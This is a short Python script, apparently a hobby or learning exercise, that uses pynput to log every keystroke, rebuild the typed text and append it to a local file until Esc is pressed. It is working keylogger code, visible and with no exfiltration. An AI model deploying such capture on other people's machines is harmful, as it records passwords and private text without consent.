from pynput.keyboard import Key, Listener
input = ""

def on_press(key):
  global input
  print("{0} pressed".format(key))
  print(f"String ver is {str(key)}")

  if key == Key.enter:
    input += "\n"
  elif key == Key.tab:
    input += "\t"
  elif key == Key.space:
    input += " "
  elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
    pass
  elif key == Key.alt or key == Key.alt_r or key == Key.alt_l:
    pass
  elif key == Key.backspace and len(input) == 0:
    pass
  elif key == Key.backspace and len(input) > 0:
    input = input[:-1]
  elif key == Key.ctrl_l or key == Key.ctrl_r:
    pass
  elif hasattr(key, "char") and key.char is not None:
    input += key.char
  else:  
    input += str(key).strip("'")
  
  if len(input) >= 20:
    with open("user_input.txt", "a") as file:
      file.write(input)
      input = ""

def on_release(key):
  if key == Key.esc:
    return False

with Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()